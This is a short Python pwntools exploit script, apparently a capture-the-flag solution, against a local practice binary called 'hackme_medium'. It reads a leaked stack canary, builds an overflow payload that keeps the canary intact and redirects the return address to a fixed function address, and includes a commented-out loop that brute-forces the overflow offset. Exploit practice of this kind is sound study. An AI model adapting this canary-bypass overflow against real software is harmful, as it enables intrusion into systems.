from pwn import *


def setupCanary(io, canary):
    return cyclic(8) + p64(canary)

io = process('./hackme_medium')

canaries = []
io.sendline('-s')
for a in range(10):
    canaries.append(io.recvline())

tallInteger = int(canaries[4], 16)
payload = setupCanary(io, tallInteger)

payload += cyclic(8) + p64(0x401216)

print("sending payload now")

io.send(payload)
    
io.shutdown('out')

print(io.readall())

""""
for i in range(0, 30):
    print(f"trying sending {i} bytes")
    io = process('./hackme_medium')

    canaries = []
    io.sendline('-s')
    for a in range(10):
        canaries.append(io.recvline())

    tallInteger = int(canaries[4], 16)
    payload = setupCanary(io, tallInteger)

    payload += cyclic(i)

    print("sending payload now")

    io.send(payload)
    
    io.shutdown('out')

    
    io.wait_for_close()
    if io.poll() != 0:
        print(f"RIP (maybe) at offset {i}")

"""
